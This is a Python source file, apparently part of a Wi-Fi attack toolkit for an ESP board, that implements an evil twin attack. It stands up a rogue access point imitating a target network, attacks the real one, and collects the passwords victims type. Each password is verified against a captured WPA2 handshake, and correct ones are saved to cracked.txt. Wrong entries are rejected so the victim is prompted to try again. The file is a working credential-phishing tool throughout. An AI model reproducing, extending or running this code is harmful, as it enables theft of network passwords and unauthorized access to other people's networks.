# eviltwin.py
import time
import sys
from config import C_GREEN, C_RED, C_YELLOW, C_RESET, C_CYAN
import cracker

class EvilTwinAttack:
    def __init__(self, esp_driver, db_handler, target_bssid, target_channel, target_ssid):
        self.esp = esp_driver
        self.db = db_handler
        self.bssid = target_bssid
        self.channel = target_channel
        self.ssid = target_ssid
        self.handshake_file = ""

    def run(self):
        # 1. التحقق من وجود Handshake
        info = self.db.get_info(self.bssid)
        if not info or not info.get('Handshake') or not info.get('HSFile'):
            print(f"{C_RED}[!] Error: No Handshake found for this network!{C_RESET}")
            return
        
        self.handshake_file = info['HSFile']
        print(f"{C_GREEN}[+] Handshake file found: {self.handshake_file}{C_RESET}")

        # 2. بدء الهجوم
        print(f"{C_CYAN}[*] Initializing Evil Twin on ESP...{C_RESET}")
        
        # إرسال أوامر البدء للبورد
        self.esp.start_host(self.ssid, self.channel)
        time.sleep(2)
        self.esp.start_attack(self.bssid, self.channel)

        print(f"\n{C_YELLOW}[*] Waiting for victim credentials... (Ctrl+C to Stop){C_RESET}")
        
        try:
            while True:
                if self.esp.captured_password:
                    # تنظيف الباسورد
                    raw_pass = self.esp.captured_password
                    password = raw_pass.strip()
                    self.esp.captured_password = None # تصفير المتغير فوراً
                    
                    print(f"{C_CYAN}[Debug] Received: '{password}' (Len: {len(password)}){C_RESET}")
                    
                    # --- [فلتر الحماية] ---
                    # باسورد WPA2 يجب أن يكون بين 8 و 63 حرف
                    if len(password) < 8:
                        print(f"{C_RED}[!] Ignored: Password too short (<8 chars). Invalid WPA2.{C_RESET}")
                        # نرسل NO للبورد لكي يظهر للضحية رسالة "باسورد خطأ" ويحاول مجدداً
                        self.esp.send_no()
                        continue
                    
                    # التحقق الفعلي (فقط للباسوردات الصحيحة شكلياً)
                    print(f"[*] Verifying password...")
                    if cracker.verify_password(self.handshake_file, self.bssid, self.ssid, password):
                        print(f"\n{C_GREEN}!!! PASSWORD CORRECT: {password} !!!{C_RESET}")
                        self.esp.send_ok()
                        
                        # حفظ الباسورد
                        with open("cracked.txt", "a") as f:
                            f.write(f"SSID: {self.ssid} | PASS: {password}\n")
                        
                        # إيقاف الهجوم والعودة
                        self.esp.stop_all()
                        return
                    else:
                        print(f"{C_RED}[-] Password Incorrect.{C_RESET}")
                        self.esp.send_no()
                
                time.sleep(0.5)

        except KeyboardInterrupt:
            print("\n[!] Attack Aborted by user.")
        
        self.esp.stop_all()